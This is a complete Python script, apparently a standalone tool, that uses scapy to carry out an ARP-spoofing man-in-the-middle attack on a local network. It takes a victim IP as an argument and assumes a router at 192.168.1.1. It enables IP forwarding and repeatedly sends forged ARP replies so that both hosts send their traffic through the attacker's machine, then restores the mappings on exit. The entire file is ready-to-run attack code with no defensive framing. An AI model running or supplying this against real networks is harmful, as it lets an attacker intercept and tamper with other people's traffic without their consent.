#!/usr/bin/env python3

import sys
# Disable scapy startup warnings
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time


def arp_reply(dest_ip, src_ip, mac, count=1):
    print("Telling {} that {} is at {}".format(src_ip, dest_ip, mac))
    ARP_REPLY_CODE = 2
    arp = ARP(op=ARP_REPLY_CODE, psrc=src_ip, pdst=dest_ip, hwdst=mac)
    send(arp, verbose=False, count=count)


def get_mac(ip):
    mac = None
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    ans, unans = srp(arp_request, timeout=2, verbose=False)
    if ans:
        first_response = ans[0]
        req, res = first_response
        mac = res.getlayer(Ether).src

    return mac


def get_ip_mac_map(ip_list):
    ip_to_mac_map = {}
    for ip in ip_list:
        ip_to_mac_map[ip] = get_mac(ip)

    return ip_to_mac_map


def set_ip_forwarding(ip_forwarding):
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        if ip_forwarding:
            ipf.write('1\n')
        else:
            ipf.write('0\n')


def arp_spoof(ip1, ip2, mac, interval=10):
    print("ARP Poisoning {} and {} with mac: {}".format(ip1, ip2, mac))
    while 1:
        arp_reply(ip1, ip2, mac)
        arp_reply(ip2, ip1, mac)
        print("Sleeping for {} seconds\n".format(interval))
        time.sleep(interval)


if __name__ == '__main__':
    # Get MAC of this computer
    mac = get_if_hwaddr('eth0')

    # Assume the router is 192.168.1.1
    router_ip = '192.168.1.1'

    try:
        victim_ip = sys.argv[1]

    except IndexError:
        print("Usage: {} <victim ip>".format(sys.argv[0]))
        sys.exit(1)

    original_macs = get_ip_mac_map([router_ip, victim_ip])

    print("Victim ({}) mac: {}".format(victim_ip, original_macs[victim_ip]))
    print("Router ({}) mac: {}".format(router_ip, original_macs[router_ip]))

    set_ip_forwarding(True)
    try:
        arp_spoof(router_ip, victim_ip, mac)
    except KeyboardInterrupt:
        # Restore original mappings
        print("Restoring original macs...")
        arp_reply(router_ip, victim_ip, original_macs[victim_ip], count=3)
        arp_reply(victim_ip, router_ip, original_macs[router_ip], count=3)
        set_ip_forwarding(False)
        print("Done")

